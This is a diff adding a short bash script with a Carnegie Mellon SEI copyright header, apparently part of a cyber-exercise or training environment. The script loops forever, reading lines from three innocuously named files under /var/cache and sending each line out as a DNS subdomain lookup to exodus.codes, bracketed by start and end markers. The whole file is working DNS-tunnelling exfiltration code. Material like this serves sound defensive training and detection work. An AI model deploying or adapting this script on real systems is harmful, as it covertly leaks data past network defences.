@@ -1,0 +1,50 @@
+#!/bin/bash
+
+# Copyright 2024 Carnegie Mellon University.
+# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
+# root or contact permission@sei.cmu.edu for full terms.
+
+while true
+do
+   input="/var/cache/554edf00.cfg"
+
+   dig start.exodus.codes;
+
+   while IFS= read -r line
+   do
+      echo "$line"
+      dig "$line.exodus.codes"
+   done < "$input"
+
+   dig end.exodus.codes
+
+   sleep 5
+
+   input="/var/cache/d112ac00.cfg"
+
+   dig start.exodus.codes;
+
+   while IFS= read -r line
+   do
+      echo "$line"
+      dig "$line.exodus.codes"
+   done < "$input"
+
+   dig end.exodus.codes
+
+   sleep 5
+
+   input="/var/cache/dd31aff5.cfg"
+
+   dig start.exodus.codes;
+
+   while IFS= read -r line
+   do
+     echo "$line"
+     dig "$line.exodus.codes"
+   done < "$input"
+
+   dig end.exodus.codes
+
+   sleep 5
+done
